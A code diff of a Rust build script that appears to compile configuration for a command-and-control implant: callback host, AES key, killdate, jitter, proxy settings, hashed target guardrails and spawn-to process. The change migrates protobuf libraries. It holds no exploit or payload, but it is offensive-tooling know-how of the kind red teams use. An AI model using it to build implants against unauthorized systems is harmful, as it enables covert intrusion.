@@ -1,12 +1,12 @@
 use base64::{engine::general_purpose, Engine as _};
 use chrono::{DateTime, Utc};
-use quick_protobuf::MessageWrite;
+use prost::Message;
 use serde::Deserialize;
 use sha2::Digest;
-use std::{borrow::Cow, collections::HashMap, io::Write, path::Path, str::FromStr};
+use std::{collections::HashMap, io::Write, path::Path, str::FromStr};
 use utils::uuid::Uuid;
 
-use config::proto::config::{Config, HttpConfig, ProxyInfo};
+use config::config_pb::{Config, HttpConfig, ProxyInfo};
 
 const DEFAULT_CONFIG: &str = r#"{
 	"uuid": "00000000-0000-0000-0000-000000000000",
@@ -105,9 +105,9 @@ const DEFAULT_CONFIG: &str = r#"{
 "#;
 
 #[derive(Deserialize, Debug)]
-struct InputConfig<'a> {
+struct InputConfig {
     uuid: String,
-    c2_profiles: Vec<C2Profile<'a>>,
+    c2_profiles: Vec<C2Profile>,
     build_parameters: Vec<BuildParameter>,
 }
 
@@ -132,13 +132,13 @@ enum BuildParameter {
 
 #[derive(Deserialize, Debug, PartialEq, Eq)]
 #[serde(tag = "c2_profile", content = "c2_profile_parameters")]
-enum C2Profile<'a> {
+enum C2Profile {
     #[serde(rename = "http")]
-    Http(HttpC2ProfileParameters<'a>),
+    Http(HttpC2ProfileParameters),
 }
 
 #[derive(Deserialize, Debug, PartialEq, Eq)]
-struct HttpC2ProfileParameters<'a> {
+struct HttpC2ProfileParameters {
     #[serde(rename = "AESPSK")]
     aes_psk: AesPsk,
 
@@ -148,7 +148,7 @@ struct HttpC2ProfileParameters<'a> {
     callback_port: u32,
     encrypted_exchange_check: bool,
     get_uri: String,
-    headers: HashMap<Cow<'a, str>, Cow<'a, str>>,
+    headers: HashMap<String, String>,
 
     #[serde(with = "killdate_format")]
     killdate: DateTime<Utc>,
@@ -280,34 +280,31 @@ fn main() {
 
     let domains = get_build_param!(json_config, BuildParameter::Domains(d), {
         Some(hash_guard_list(d))
-    })
-    .unwrap_or_default();
+    });
 
     let hostnames = get_build_param!(json_config, BuildParameter::Hostnames(h), {
         Some(hash_guard_list(h))
-    })
-    .unwrap_or_default();
+    });
 
     let usernames = get_build_param!(json_config, BuildParameter::Usernames(u), {
         Some(hash_guard_list(u))
-    })
-    .unwrap_or_default();
+    });
 
     let spawn_to =
         get_build_param!(json_config, BuildParameter::SpawnTo(s), s.clone()).unwrap_or_default();
 
     let mut config = Config {
-        uuid: Cow::Borrowed(uuid.as_slice()),
+        uuid: uuid.as_slice().to_vec(),
         working_hours_start: working_hours.0,
         working_hours_end: working_hours
             .1
             .checked_add(60)
             .expect("Working hours end is too large"),
         connection_retries,
-        domains: Cow::Borrowed(&domains),
-        hostnames: Cow::Borrowed(&hostnames),
-        usernames: Cow::Borrowed(&usernames),
-        spawn_to: Cow::Borrowed(&spawn_to),
+        domains,
+        hostnames,
+        usernames,
+        spawn_to,
         ..Default::default()
     };
 
@@ -321,7 +318,7 @@ fn main() {
         });
 
         config.http = Some(HttpConfig {
-            callback_host: Cow::Owned(profile.callback_host),
+            callback_host: profile.callback_host,
             killdate: profile
                 .killdate
                 .timestamp()
@@ -329,19 +326,19 @@ fn main() {
                 .expect("Killdate is less than 1970"),
             callback_jitter: profile.callback_jitter,
             headers: profile.headers,
-            aes_key: Cow::Owned(aes_key.unwrap_or_default()),
-            get_uri: Cow::Owned(profile.get_uri),
-            post_uri: Cow::Owned(profile.post_uri),
-            query_path_name: Cow::Owned(profile.query_path_name),
+            aes_key,
+            get_uri: profile.get_uri,
+            post_uri: profile.post_uri,
+            query_path_name: profile.query_path_name,
             proxy: {
                 if !profile.proxy_host.is_empty() {
                     Some(ProxyInfo {
-                        host: Cow::Owned(profile.proxy_host),
+                        host: profile.proxy_host,
                         port: profile
                             .proxy_port
                             .parse()
                             .expect("Failed to parse proxy port"),
-                        pass: Cow::Owned(profile.proxy_pass),
+                        pass: profile.proxy_pass,
                     })
                 } else {
                     None
@@ -357,8 +354,16 @@ fn main() {
         .unwrap()
         .join(".config.bin");
 
-    config
-        .write_file(output_file)
+    let serialized_config = config.encode_to_vec();
+
+    let mut f = std::fs::OpenOptions::new()
+        .create(true)
+        .write(true)
+        .read(true)
+        .open(output_file)
+        .expect("Failed to open .config.bin");
+
+    f.write_all(&serialized_config)
         .expect("Failed to write serialized config");
 
     println!("cargo:rerun-if-changed={}", config_path.to_str().unwrap());
